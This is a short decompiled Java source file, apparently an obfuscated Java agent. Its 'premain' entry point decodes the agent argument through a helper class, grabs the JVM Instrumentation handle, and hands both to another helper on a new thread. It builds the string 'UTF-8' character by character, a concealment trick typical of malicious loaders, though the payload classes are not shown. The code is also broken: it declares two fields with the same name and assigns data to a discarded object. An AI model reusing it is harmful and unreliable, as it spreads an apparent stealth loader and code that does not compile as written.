package net.java;

import java.lang.instrument.Instrumentation;
import net.java.l;
import net.java.m;

/*
 * Duplicate member names detected
 */
public class f
implements Runnable {
    private byte[] a;
    private Instrumentation a;

    public static void premain(String object, Instrumentation instrumentation) {
        byte[] byArray = null;
        if (object != null) {
            try {
                String string = object;
                object = new StringBuilder();
                ((StringBuilder)object).append('U');
                ((StringBuilder)object).append('T');
                ((StringBuilder)object).append('F');
                ((StringBuilder)object).append('-');
                ((StringBuilder)object).append('8');
                byArray = l.a(string.getBytes(((StringBuilder)object).toString()));
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        m.a();
        object = new f();
        new f().a = byArray;
        ((f)object).a = instrumentation;
        new Thread((Runnable)object).start();
    }

    public void run() {
        Object[] objectArray = new Object[6];
        objectArray[0] = this.a;
        objectArray[1] = this.a;
        objectArray[2] = 1;
        objectArray[5] = m.a.trim();
        l.a(objectArray);
    }
}
